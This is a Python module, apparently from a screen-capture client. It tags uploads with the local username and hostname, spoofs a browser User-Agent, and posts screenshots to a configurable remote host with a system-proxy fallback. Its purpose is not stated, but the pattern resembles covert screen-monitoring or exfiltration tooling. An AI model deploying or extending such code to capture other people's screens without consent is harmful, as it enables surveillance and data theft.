import requests
import getpass
import socket
from urllib.request import getproxies
from typing import Optional, Dict

# Identify client
username = getpass.getuser()
hostname = socket.gethostname()

# Reusable HTTP sessions (direct and proxy-aware)
_DIRECT_SESSION: Optional[requests.Session] = None
_PROXY_SESSION: Optional[requests.Session] = None
_PROXIES: Optional[Dict[str, str]] = None

# Friendly UA to look like a browser (some proxies are picky)
_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)


def _normalize_proxies(p: Dict[str, str]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for k, v in (p or {}).items():
        lk = k.lower()
        if lk not in ("http", "https", "socks", "socks5", "socks4"):
            continue
        vv = v.strip()
        if "://" not in vv:
            # Assume http proxy if scheme not provided (common on Windows registry)
            vv = f"http://{vv}"
        out[lk] = vv
    return out


def _get_direct_session() -> requests.Session:
    global _DIRECT_SESSION
    if _DIRECT_SESSION is None:
        s = requests.Session()
        s.headers.update({"User-Agent": _UA})
        # Do not inherit env proxies for the direct session
        s.trust_env = False
        _DIRECT_SESSION = s
    return _DIRECT_SESSION


def _get_proxy_session() -> Optional[requests.Session]:
    global _PROXY_SESSION, _PROXIES
    if _PROXY_SESSION is not None:
        return _PROXY_SESSION

    if _PROXIES is None:
        try:
            _PROXIES = _normalize_proxies(getproxies())
        except Exception:
            _PROXIES = {}

    if not _PROXIES:
        return None

    s = requests.Session()
    s.headers.update({"User-Agent": _UA})
    s.trust_env = False  # we'll explicitly set proxies below
    s.proxies.update(_PROXIES)
    _PROXY_SESSION = s
    return _PROXY_SESSION


def send_screenshot(host_url, monitor_num, image_bytes):
    """Send a screenshot to the host.

    This function is proxy-aware to support Astrill OpenWeb mode.
    It tries direct first (fast), then falls back to system proxy if available.
    """
    url = f"http://{host_url}/v2/{username}_{hostname}/{monitor_num}/upload"

    files = {
        "screenshot": ("screen.webp", image_bytes, "image/webp"),
    }

    # 1) Try direct (short timeout)
    try:
        resp = _get_direct_session().post(url, files=files, timeout=4)
        if resp.status_code == 200:
            return True
        else:
            # If server reachable but not OK, don't retry via proxy
            return False
    except requests.RequestException:
        pass  # fall through to proxy attempt

    # 2) Try via system proxy (if present)
    proxy_sess = _get_proxy_session()
    if proxy_sess is None:
        return False

    try:
        resp = proxy_sess.post(url, files=files, timeout=10)
        return resp.status_code == 200
    except requests.RequestException:
        return False
